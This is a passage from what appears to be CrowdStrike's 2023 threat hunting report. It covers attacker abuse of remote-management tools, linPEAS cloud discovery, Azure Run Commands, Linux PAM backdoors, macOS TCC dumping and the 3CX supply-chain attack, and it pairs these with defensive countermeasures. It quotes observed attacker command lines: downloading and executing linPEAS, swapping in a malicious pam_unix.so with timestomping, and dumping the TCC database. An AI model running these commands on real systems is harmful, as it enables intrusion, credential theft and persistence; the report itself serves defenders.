client and server components and for multiple operating systems. Adversaries have 
likely adopted RustDesk to avoid detections in place for myriad other well\-known 
RMM alternatives. 

Notes for Defenders

The RustDesk domain rustdesk\[.]com and GitHub repository 
github\[.]com/rustdesk host binaries and source code for RustDesk. 
Unauthorized use of this tool is the first indicator of potentially malicious activity. 

RustDesk can be configured to use any internal or external IP or domain for 
its server components. Therefore, defenders must look for other indicators 
of attack (IOAs). The client install tends to be artifact\-heavy, based on Falcon 
OverWatch observations. The following are example command lines from Falcon 
OverWatch\-observed intrusions that can be used when looking for evidence of 
malicious activity.

The RustDesk installer may configure a Windows host firewall rule for client 
communication:

netsh advfirewall firewall add rule name\="RustDesk Service" dir\=in 

action\=allow 

program\="C:\\Program Files\\RustDesk\\RustDesk.exe" 

enable\=yes

The RustDesk installer may add registry keys for the installed client:

reg add 

HKEY\_CLASSES\_ROOT\\.rustdesk\\shell\\open\\command /f /ve 

/t REG\_SZ /d "\\"C:\\Program Files\\RustDesk\\RustDesk

The RustDesk installer may create a service, with or without an imported 
configuration option, for the installed client:

sc create RustDesk binpath\= "\\"C:\\Program Files\\RustDesk\\RustDesk.

exe\\" \-\-import\-config \\"C:\\Users\\\[REDACTED Path]\\AppData\\Roaming\\

Notable Tool: FleetDeck

Falcon OverWatch observed FleetDeck abuse exclusively by SCATTERED 
SPIDER.29 If FleetDeck is not a legitimate tool in the IT environment, the unexpected 
presence of the tool should be taken as an IOA.

FleetDeck currently supports agents for the Windows operating system, with 
agents for macOS and Linux in development. Remote agents operate over TCP port 
443, which, depending on host and network firewall configurations, may facilitate 
egress from victim environments. Like RustDesk, the tool is new and less likely to be 
detected than more prevalent RMM tool choices. Unlike RustDesk, the product is a 
commercial offering, and source code is not available.

Notes for Defenders

Falcon OverWatch observed FleetDeck activity at multiple entities primarily in the 
services, technology and telecommunications verticals. The following insights 
are based on this real\-world activity and contain common indicators of FleetDeck 
activity, which defenders can use when hunting. 

The adversary tested the internet connection to FleetDeck domain:

ping fleetdeck.io

The adversary dropped the FleetDeck agent to the victim environment:

C:\\Users\\\[REDACTED Path]\\Downloads\\fleetdeck\-agent\-\[REDACTED 

22CharacterKey].exe

Note that the agent installer listed above can be executed silently by appending the 
\-silent flag to the command.

The adversary created a Windows host firewall rule via PowerShell for FleetDeck 
client communication:

C:\\WINDOWS\\Sysnative\\WindowsPowerShell\\v1\.0\\powershell.exe \-Command 

"New\-NetFirewallRule \-DisplayName 'FleetDeck Agent Service' \-Name 

'FleetDeck Agent Service Command' \-Direction Inbound \-Program 'C:\\

Program Files (x86\)\\FleetDeck Agent\\fleetdeck\_agent\_svc.exe' \-Action

Defensive Countermeasures

Monitor and conduct active hunts for 
newly identified threats.

The RMM tool landscape is dynamic. As new tools are identified or known tools add 
new functionality, research the new RMM behaviors and actively review logs for 
evidence of execution.

Implement application allowlisting.

Threat actors may attempt to execute RMM tools that are not standard software in 
the victim environment. Application allowlisting prevents unapproved binaries from 
executing within an organization's environment. 

Monitor for unapproved RMM applications.

Conduct long\-tail analysis on installed applications and observed executables 
within an organization's fleet of endpoints to identify outliers that may be 
unapproved software, including RMM tools. 

Monitor for unexpected host firewall changes.

RMM tools may alter host firewall rules as part of an installation process. Review 
unexpected changes in host firewall rules that may indicate an unapproved 
application installation altered those rules.

Strengthen firewall rules and network 
access control lists.

Many RMM software packages require connectivity to known external endpoints 
over common ports and protocols that can be blocked. Server, cloud and 
administrative segments should receive extra scrutiny, and all external connectivity 
should be denied other than to allowlisted endpoints.

in Cloud Know\-How

Cloud\-conscious adversaries are navigating cloud environments with a level of skill 
and confidence that is, unfortunately, often not matched by organizations’ in\-house 
security teams. 

Over the past few years, the adoption of cloud\-based technologies has 
experienced a meteoric rise, with organizations from all sectors embracing this 
paradigm shift. The benefits that cloud computing provides have made it an 
indispensable part of businesses’ modern IT infrastructure. However, the rapid 
surge in demand for cloud services, along with the complexity of cloud management 
and controls, has led to a knowledge gap in properly securing these environments. 
The nature of the attack surface has changed and presents significant security 
challenges for organizations with a cloud presence.

In the past year, Falcon OverWatch has observed numerous instances of insecure 
configurations as well as built\-in cloud platform functionality being abused by 
adversaries to progress their intrusions. As first reported in the CrowdStrike 2023 
Global Threat Report, there was a threefold increase in cases involving cloud\-
conscious threat actors coupled with a 95% increase in cloud exploitation from 
2021 to 2022\. It is clear that adversaries are aware of the importance of the cloud 
and tenacious in their efforts to access cloud assets. 

When it comes to securing the cloud, the old security adage “know thy systems'' 
is particularly pertinent. Adversaries are quick to take advantage of visibility and 
knowledge gaps.

ADVERSARIES LEVERAGE LINPEAS TOOL 
FOR CLOUD DISCOVERY

Falcon OverWatch detected several intrusions at the cloud workload level where 
adversaries gained access to a cloud server and used the Linux privilege escalation 
tool linPEAS to enumerate the environment. Although linPEAS has been around 
for several years, in the past year, Falcon OverWatch saw its use by eCrime and 
targeted intrusion adversaries triple. 

LinPEAS has a cloud module that attempts to determine in which cloud 
environment, if any, the module is running through a process of fingerprinting. 
This process inspects local files including /etc/hosts, /etc/resolv.conf and 
vendor\-specific configuration files, as well as HTTP requests using both curl and 
wget, to a well\-known cloud service provider’s API endpoints. The cloud module 
currently supports discovery of Google Cloud, DigitalOcean Droplet, IBM Cloud, 
and Amazon's Elastic Container Service (ECS), Elastic Compute Cloud (EC2\), 
EC2 Beanstalk and Lambda. If a cloud service provider is identified, the module will 
enumerate details of the identified cloud environment, which may include machine 
attributes such as the instance metadata (ID, name, region or zone, and image); 
network attributes (public and private IPs, hostnames); and various user, service 
and security credentials depending on cloud service provider and cloud security 
configuration. 

In one instance, Falcon OverWatch discovered an adversary downloading a pre\-
compiled version of the linPEAS tool. They renamed the file via mv, set execute 
permissions and attempted execution of the file:

wget https\[:]//github\[.]com/carlospolop/PEASS\-ng/releases/download/

\[REDACTED Path]/linpeas\_darwin\_arm64

mv linpeas\_darwin\_arm64 x

chmod \+x x

./x

Not all ingress of the linPEAS tool comes from the official GitHub repository 
— adversaries are also known to stage tooling to sources under their control. 
Reasons for this may include ready access to custom\-compiled versions to evade 
signature\-based detection, as well as avoiding source URLs that identify the tooling. 
In this second example, Falcon OverWatch observed the adversary attempting to 
download linPEAS from a common file\-sharing website after a previous attempt 
from the GitHub repository was prevented:

wget https\[:]//github\[.]com/carlospolop/PEASS\-ng/releases/download/

\[REDACTED Path]/linpeas\_linux\_amd64 \-O aa

wget https\[:]//filebin\[.]net/\[REDACTED Path]/\[REDACTED FileName]

The cloud discovery module of linPEAS can allow access to sensitive information 
about cloud environments. However, these examples also highlight a long\-term, 
persistent problem Falcon OverWatch observes across many intrusions: Victim 
environments are configured in a way that enables the adversary to access external 
resources from within the victim environment to download additional malware. 

© 2023 CrowdStrike, Inc. All rights reserved. NOWHERE TO HIDECROWDSTRIKE 2023 THREAT HUNTING REPORT33

Defensive Countermeasures

On\-premises security best practices 
apply in the cloud.

In the previous examples, the adversary initiated an outbound connection from 
the cloud workload instance to an external website to download malicious files. 
Cloud workload servers should be subject to at least the same security policies as 
any other server. Best practice dictates that outbound connections initiated from 
any server should be denied other than to allowlisted endpoints.30 This practice 
accomplishes two important goals: First, it helps to deny the adversary access 
to internet resources and prevents direct malware ingress. Second, if an attack 
should progress, it makes it much more difficult for an adversary to exfiltrate data or 
establish a C2 channel directly from the compromised cloud asset to an external 
endpoint. 

Know your systems or invest in security 
measures to improve visibility.

CrowdStrike's cloud\-native application protection platform (CNAPP)31 provides 
visibility into cloud assets and can help security practitioners understand and 
improve the overall baseline security posture and compliance of their environments. 
Falcon OverWatch provides added defense in the cloud for novel threats and alerts 
security teams with contextualized detection information when such threats are 
discovered in a customer's environment.

30 For further guidance, see NIST 800\-53 REV 5, SC\-7(5\).

ECRIME ADVERSARIES USE AZURE RUN 
COMMANDS TO DEPLOY MALWARE

Although not new, a less commonly discussed vector for cloud\-conscious 
execution is the use of Azure Run Commands. In the past year, Falcon OverWatch 
observed multiple instances of eCrime adversaries using this Azure feature 
to attempt script execution across virtual machines (VMs) in Azure cloud 
environments. 

Run Commands are part of the default VM agent and legitimately used to manage 
Azure VMs. Azure supports multiple versions of Windows and various distributions 
of Linux. Azure Run Commands similarly support both operating systems. Azure 
Run Commands can be executed in several ways, including from the Azure Portal, 
Azure REST API, Azure Command\-Line Interface (CLI) and through PowerShell on 
an Azure VM. An adversary can use Azure Run Commands to execute with elevated 
privileges — PowerShell scripts on a Windows VM run as SYSTEM, and shell scripts 
on a Linux VM run as root. This creates potential for remote execution, lateral 
movement and privilege escalation, as such permissions to execute Azure Run 
Commands must be tightly controlled and closely monitored for any changes.

Adversaries are actively exploiting this feature in Azure. In one example, Falcon 
OverWatch observed SCATTERED SPIDER execute a PowerShell script via the 
RunPowerShellScript command to deploy an RMM binary to a set of Azure VMs. 
Falcon OverWatch also observed adversaries attempting to use the technique to 
deploy RMM binaries and other tools across Linux VMs.

To date, Falcon OverWatch has observed Azure Run Commands used primarily 
in attempts to deploy tooling across a victim environment. However, the elevated 
privileges under which the scripts execute could also allow an adversary to read 
privileged files, exfiltrate data and alter permissions of other files and directories, 
to name a few actions.

Defensive Countermeasures

Know where to look for trouble.

If malicious activity is suspected, the following locations are relevant for defenders 
to understand what is occuring. 

For Azure Windows VMs, downloaded scripts will be placed in the following 
directories for execution:

C:\\Packages\\Plugins\\Microsoft.CPlat.Core.RunCommandWindows\\\\Downloads\\

Output from the execution of the scripts can be found in a similar location:

C:\\Packages\\Plugins\\Microsoft.CPlat.Core.RunCommandWindows\\\\Status\\

For Azure Linux VMs, both the downloaded scripts and the execution output 
(stdout and stderr) will be written in the same directory:

/var/lib/waagent/run\-command/download/

Understand the core functionality of the cloud 
platforms you’re running.

Cloud\-conscious adversaries will continue to seek new ways to use legitimate 
features of Azure management and orchestration in support of their malicious 
objectives. Falcon OverWatch encourages all defenders to dig deeper into the 
technology and fully understand the environments for which they are responsible.

website32 to help with this journey.

Compromised Cloud Credentials 
Facilitate Widespread Lateral 
Movement 

Cloud\-conscious adversaries are keenly aware of how to leverage cloud tooling and 
services that are available to them once they gain an initial foothold into a victim’s 
environment. This is analogous to a traditional on\-premises compromise, during 
which an adversary may use one of the many already installed tools — aka “living off 
the land” binaries and scripts (LOLBAS) — to further their objectives. The following 
intrusion demonstrates the adversary TTPs used to pivot from on\-premises devices 
to cloud infrastructure. 

In early 2023, Falcon OverWatch detected an adversary exploiting a custom PHP 
web application at a North American customer in the retail sector. By leveraging 
a RCE vulnerability, the adversary was able to gain unauthorized access to 
the underlying system. Once inside, they proceeded to harvest cloud service 
provider credentials. Using these newly found credentials, the adversary began 
to move laterally in the victim’s environment using the cloud service provider’s 
system manager. This maneuver allowed the adversary to extend their reach to 
compromise additional resources and embed deeper into the victim’s environment.

This intrusion, explored in more detail in Figure 11, highlights the expanded 
attack surface customers must now protect and the necessity of securing both 
on\-premises and cloud infrastructure components. 

Defensive Countermeasures

Identify and manage vulnerabilities.

Regularly monitor cloud assets and applications for vulnerabilities, and patch or 
otherwise address identified risks in a timely manner. Vulnerable internet\-facing 
cloud assets, in particular, are at risk of facilitating initial access for adversaries. 
Consider adopting cloud workload protection (CWP) solutions that offer continuous 
vulnerability management in addition to endpoint detection and response (EDR) 
and other runtime protections at both the cloud virtual machine and container levels.

Secure from start to finish.

Cloud resource configurations should be standardized and validated prior to 
deployment, and thereafter constantly monitored for deviations from approved 
standards. Cloud security posture management (CSPM) solutions can help 
monitor multiple cloud service providers, identify misconfigurations pre\- and post\-
deployment, and significantly reduce risk. Secure configurations prevent access to 
sensitive resources by unauthorized entities, reducing the likelihood of success of 
follow\-on tactics such as privilege escalation, lateral movement and data collection.

Takes Center Stage 

Today’s organizations rely on multiple operating systems working in concert for 
IT environments to run efficiently. Falcon OverWatch threat hunters are skilled at 
hunting across all major platforms — Windows, Linux and macOS. 

This year, Falcon OverWatch saw adversaries showcase their prowess across all 
of these systems. LABYRINTH CHOLLIMA led the charge, highlighting their ability 
to operate across Windows and macOS in their targeting of the 3CX supply chain. 
Notorious for targeting financial technology and cryptocurrency organizations, 
LABYRINTH CHOLLIMA was observed updating both their custom tooling and 
their tradecraft to work specifically on Linux and macOS. 

Threat Actor Spotlight: LABYRINTH CHOLLIMA

LABYRINTH CHOLLIMA is one of the most prolific Democratic People’s Republic 
of Korea (DPRK) adversaries tracked by CrowdStrike and has been active since at 
least 2009\. CrowdStrike assesses this adversary is likely affiliated with Bureau 121 
of the DPRK’s Reconnaissance General Bureau (RGB) — North Korea’s preeminent 
intelligence service. 

Their currency generation operations are global in scope, and stolen proceeds 
appear to be a lifeline for the DPRK regime. LABYRINTH CHOLLIMA’s operations 
have varied in complexity and exhibit tradecraft ranging from pedestrian to state\-
of\-the\-art, suggesting this group is supported by a large number of operators with 
varying technical aptitude. LABYRINTH CHOLLIMA’s campaigns broadly trend 
toward a greater emphasis on operational security and defense evasion tactics, 
with the adversary increasing efforts to evade traditional detection methods and 
hinder third\-party analysis and tracking of its campaigns.

The Role of 
Linux Hosts in an 
Organization

Because Linux hosts primarily 
function as infrastructure as opposed 
to end\-user machines, typical social 
engineering tactics that require end\-
user interaction — such as phishing 
attachments or end\-user execution 
— are not viable initial access 
techniques. Instead, adversaries 
targeting Linux systems either 
leverage vulnerabilities in public\-
facing applications or externally 
exposed remote services, or abuse 
valid credentials to gain access to a 
target device. Once on a Linux host, 
an adversary’s success often hinges 
on their ability to execute intrusions by 
leveraging native tools within a Linux 
environment. Where the required 
tools are not immediately available, 
they are often easily accessible by 
leveraging native binaries to pull down 
scripts or tools from repositories or 
adversary staging servers.

LINUX INSIGHTS AND TRENDS 

Falcon OverWatch continues to observe adversaries operating comfortably 
within Linux environments to progress their mission objectives. As shown in 
Figure 12, Linux\-based interactive intrusion activity is most commonly seen in the 
technology and telecommunications verticals.

Common Linux Tooling Provides Substantial Functionality to 
Adversaries

Over the past year, Falcon OverWatch observed adversaries traversing most 
tactics across the MITRE ATT\&CK framework, leveraging only native or widely 
accessible command\-line tooling. For example, an adversary can leverage nmap 
for network discovery; 33 cat to read various credentials, history,34 configuration, 
and database files; ps, grep or find to perform discovery on running 
processes and existing files; ping for connectivity checks;35 curl, git or wget 
to download files; as to translate assembly code to object code; bash or python to 
execute said scripts; and rm to delete logs and clean up their tracks.36

40

Bash is the default shell in most Linux installations. Falcon OverWatch, however, 
has observed adversaries use alternative shells like dash and zshell (zsh) in their 
interactive intrusions. Given that most security tools leverage string matching in 
detections, Falcon OverWatch hypothesizes that the use of alternate shells could 
be attributed to signature evasion and adversarial preferences for increased speed, 
hyperthreading and/or smaller size. Though alternative shells like dash may lack some 
features like tab completion, Falcon OverWatch predicts that alternative shells will 
remain popular in the future. 

Though this tactic is not very common, Falcon OverWatch observed a threefold 
increase year over year in adversaries replacing PAM37 with malicious modules, 
typically for the purposes of a backdoor. The legitimate PAM, depending on the 
distribution, tends to reside in /usr/lib64/security/pam\_unix.so or /usr/lib/
security/pam\_unix.so. The adversaries masquerade38 their malicious module as 
the PAM pam\_unix.so or have their malicious version staged in another directory 
(e.g., /tmp/pam\_unix.so) before overwriting the legitimate module.

chmod 755 pam\_unix.so

cp \-i pam\_unix.so pam\_unix.so.1

cp \-i /tmp/pam\_unix.so pam\_unix.so

touch \-r pam\_xauth.so pam\_unix.so

touch \-r pam\_xauth.so pam\_unix.so.1

In the above example, the touch commands were likely used to conduct 
timestomping39 to further evade detection.

macOS INSIGHTS AND TRENDS

Falcon OverWatch observed a marked increase in the number of interactive 
intrusions against macOS systems. The most prolific adversary, by far, was 
LABYRINTH CHOLLIMA. This group focused a number of efforts against 
organizations running macOS devices and demonstrated a high level of 
proficiency in doing so. LABYRINTH CHOLLIMA is known to target the financial 
and technology verticals, in particular cryptocurrency organizations and 
other fintech businesses that sit at the intersection of these two verticals. This 
preference plays out in the macOS intrusions by industry vertical data, shown in 
Figure 13\.

Observed macOS Tactics

Falcon OverWatch identified LABYRINTH CHOLLIMA attempting to dump the 
Transparency, Consent and Control (TCC) database. The TCC framework was 
implemented as a security and privacy control by Apple to prevent installed 
applications from being able to access sensitive data without explicit permission 
from the user, which arises as a user prompt. Such permissions include full disk, 
camera, contacts and microphone access. User responses (allow or do not allow) 
are stored in this database. If an application tries to access files in a directory 
protected by TCC without authorization, the operation is denied. As denoted by 
the command line below, TCC stores these permissions in a SQLite3 database 
located both globally (/Library/Application Support/com.apple.TCC/TCC.
db) and at the user level ($HOME/Library/Application Support/com.apple.
TCC/TCC.db).

/bin/bash \-c sqlite3 /Library/Application\\ Support/com.apple.TCC/

TCC.db '.dump access'

If an adversary were to gain write access to the TCC.db, they could grant 
themselves TCC entitlements without alerting the user. 

Apple implemented System Integrity Protection (SIP) to mitigate this. Being able 
to read the contents of the database, however, is trivial — an adversary requires 
the terminal to have full disk access, which may be already enabled on many 
MacBooks. With the dumped database, an adversary would likely leverage the 
outputs to determine what applications are allowed to access which services 
and any code\-signing requirement data (csreq). The output of this dump would 
present a gold mine of possible applications to exploit. However, the CrowdStrike 
Falcon agent prevents the dumping of the TCC database on macOS hosts.

Defensive Countermeasures

With the advances adversaries are making in targeting Linux and macOS 
environments, defenders must familiarize themselves with macOS and Linux TTPs 
and implement the appropriate defenses across their infrastructure.

Implement file integrity control and monitoring around sensitive 
files and logs.

Alert for anomalous processes reading sensitive files that may contain credentials.

Disable remote login (i.e., SSH).

If SSH must be enabled, augment with MFA and additional identity protection to 
further thwart adversaries.

Monitor and/or prevent modification of PAM components.

This can be done through proper privilege separation (e.g., SELinux).

Enable default macOS system protections.

Gatekeeper and SIP should be on by default for macOS. Monitor for any disabling 
of Gatekeeper or SIP, and implement automated re\-enabling of these protections. 
Security practitioners can automate via spctl and csrutil to re\-enable 
Gatekeeper and SIP, respectively. 

Maintain user awareness.

Training users on the pitfalls of disabling many of macOS’s built\-in security 
precautions can prove essential in mitigating social engineering tactics that require 
user execution.

Ensure coverage across the entire enterprise to reduce the attack 
surface. 

Adversaries often target vulnerable and unmanaged assets to gain initial access, 
then use lifted credentials to pivot to additional resources via trusted remote access 
software and protocols. A mix of comprehensive endpoint coverage and proactive 
threat hunting is crucial for minimizing security gaps and detecting intrusions that 
aim to evade traditional detection methods.

THREAT ACTOR SPOTLIGHT: LABYRINTH CHOLLIMA

Targeting the Supply Chain

On March 29, 2023, Falcon OverWatch observed unexpected malicious activity 
emanating from a legitimate, signed binary: 3CXDesktopApp, a softphone 
application from 3CX. The malicious activity included beaconing to actor\-
controlled infrastructure, deployment of second\-stage payloads and, in sparse 
cases, hands\-on\-keyboard activity. Once active, the HTTPS beacon structure 
and encryption key match those observed by CrowdStrike in a March 7, 2023, 
campaign attributed with high confidence to LABYRINTH CHOLLIMA.40

This attack is the result of a unique and complex adversarial supply chain 
operation. It was not simply a single supply chain compromise; rather, it was 
a layered exploitation — a double supply chain attack. The threat actor first 
breached third\-party software used by 3CX, which then provided the necessary 
conduit to ultimately compromise the 3CXDesktopApp.41

The resulting compromise led to the delivery of the Gopuram backdoor, which 
affected both Windows and macOS versions of the software. Gopuram is a 
stealthy second\-stage backdoor that employs numerous evasion techniques 
to gain unauthorized access and persist on the target host. Once deployed, the 
backdoor enabled the threat actor to execute commands, upload and download 
files, manipulate processes and services, and exfiltrate sensitive data — posing a 
considerable threat to victim organizations' networks.42 LABYRINTH CHOLLIMA’s 
targets in this campaign were predominantly cryptocurrency companies, 
once again highlighting the unique nature of this DPRK\-nexus threat actor's 
sophisticated operations focused on financial gain.

LABYRINTH CHOLLIMA, known for their history of supply chain attacks, 
managed to maintain the prolonged persistence of their backdoor within the 
infected application. This attack signifies an escalated threat with a double supply 
chain compromise and broad compatibility of their malware — highlighting their 
advanced tactics, robust operational capacity and ongoing multi\-platform threat.

The multi\-platform threat presented by LABYRINTH CHOLLIMA's latest attack 
significantly broadens the group's potential victim landscape. This underlines their 
adaptability and the increased risk they pose to diverse systems — specifically, the 
combination of Windows and macOS at once. However, this is not LABYRINTH 
CHOLLIMA’s first attack focused on macOS. The U.S. Federal Bureau of 
Investigations, Cybersecurity and Infrastructure Security Agency (CISA), and 
Department of the Treasury have released multiple joint cybersecurity advisories 
on LABYRINTH CHOLLIMA’s AppleJeus malware, which is a macOS variant 
of their Jeus malware that is commonly disguised as a cryptocurrency trading 
application.43
